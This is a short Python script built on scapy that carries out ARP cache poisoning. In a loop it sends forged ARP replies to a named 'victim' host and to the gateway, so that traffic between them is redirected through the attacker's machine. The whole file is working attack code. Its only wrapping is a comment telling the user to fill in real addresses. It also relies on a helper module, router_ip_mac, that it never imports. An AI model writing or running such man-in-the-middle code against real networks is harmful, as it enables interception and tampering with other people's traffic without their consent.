from scapy.all import *
import time

# Function to send ARP spoof (poison) packets
def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    # Send ARP response to the victim: tell victim that the attacker's MAC address is the gateway's IP
    target_arp = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    send(target_arp, verbose=False)
    
    # Send ARP response to the gateway: tell gateway that the attacker's MAC address is the victim's IP
    gateway_arp = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    send(gateway_arp, verbose=False)

# Replace these with the actual IP and MAC addresses
victim_ip = "192.168.1.5"  # Victim's IP
victim_mac = "00:11:22:33:44:55"  # Victim's MAC address
gateway_ip, gateway_mac = router_ip_mac.get_router_ip_mac()

# Continuously poison ARP tables
try:
    print("Starting ARP poisoning...")
    while True:
        arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
        time.sleep(2)  # Send ARP packets every 2 seconds
except KeyboardInterrupt:
    print("\nARP poisoning stopped.")
